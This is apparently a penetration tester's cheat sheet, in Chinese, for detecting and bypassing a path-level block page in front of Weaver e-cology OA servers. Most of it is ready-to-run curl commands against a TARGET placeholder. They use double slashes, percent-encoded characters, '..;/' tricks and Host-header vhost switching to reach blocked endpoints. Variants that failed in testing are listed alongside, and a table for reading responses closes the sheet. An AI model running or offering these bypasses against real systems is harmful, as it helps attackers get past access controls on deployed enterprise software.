# 泛微 e-cology「系统维护中」503 页的识别与绕过
# 适用：目标返回 1522 B 左右的「系统维护中」页、带 Retry-After: 300 与静态文件 ETag，
#       但 /wui/index.html、/api/doc/... 等路径却是 200 —— 说明封堵是路径级而非全站维护。

## 第一步：判定它是封堵而不是维护（3 个请求）
curl -sk -o /dev/null -w "wui:%{http_code}\n"     "https://TARGET/wui/index.html"          # 期望 200
curl -sk -o /dev/null -w "benign:%{http_code}\n"  "https://TARGET/api/hrm/login/checkPlugin" # 期望 200
curl -sk -o /dev/null -w "blocked:%{http_code}\n" "https://TARGET/weaver/"                   # 期望 503
# 只要"部分路径 200、部分路径 503"，就是封堵名单，不是维护。

## 第二步：绕过（破坏字面量匹配，不改语义）
# ① 中间插双斜杠（最有效；后端 Java 会自行归一化）
curl -sk "https://TARGET/api/hrm/login//getLoginForm"
# ② 对路径中任一字母做百分号编码（大小写不影响后端路由）
curl -sk "https://TARGET/api/hrm/login/get%4CoginForm"
# ③ 其它可试的变体（对 $request_uri 字面量正则有效）
#    /api/hrm/login/getLoginForm%3F   /api/hrm/login/ge%74LoginForm
#    /api%2fhrm/login/getLoginForm   /api/hrm/login/getLoginForm/..;/

## 已知无效（实测反例，别浪费时间）
#    /api/hrm/login/getLoginForm/       -> 仍 503
#    /api/hrm/login/./getLoginForm      -> 仍 503
#    /API/hrm/login/getLoginForm        -> 404（Spring 路径大小写敏感）
#    /api/hrm/login/getLoginForm;.css   -> 404
#    /api/hrm/login/getLoginForm%00     -> 400
#    /weaver/ 前缀对 // 、/%77 、/w%65 、/..;/ 、大小写 全部无效（上一轮 9 组实测）

## 第三步：不同 vhost 的封堵不一致，务必逐个试
# 同一 IP 的不同 Host 可能只有生产 vhost 挂了封堵名单：
curl -sk -H "Host: test.project.TARGET" "https://IP/weaver/"          # 实测 500（进了应用）而非 503
# 判定"是否进了应用"看错误页引用的图片：/images/error/500.png = 泛微自身错误页（已进应用）
curl -sk "https://TARGET/zz_nx_probe_77" | grep -o "/images/error/[0-9]*.png"   # 404.png = 站点自身 404

## 判据速查
# 503 + 1522 B + Retry-After  -> 被封堵
# 404 + 534 B + /images/error/404.png -> 路径/参数不被接受（站点自身 404，**不是 WAF**）
# 500 + 537 B + /images/error/500.png -> 已进应用、应用抛异常
# 200 + {"msg":"登录信息超时","errorCode":"002"} -> 已进业务层、需鉴权
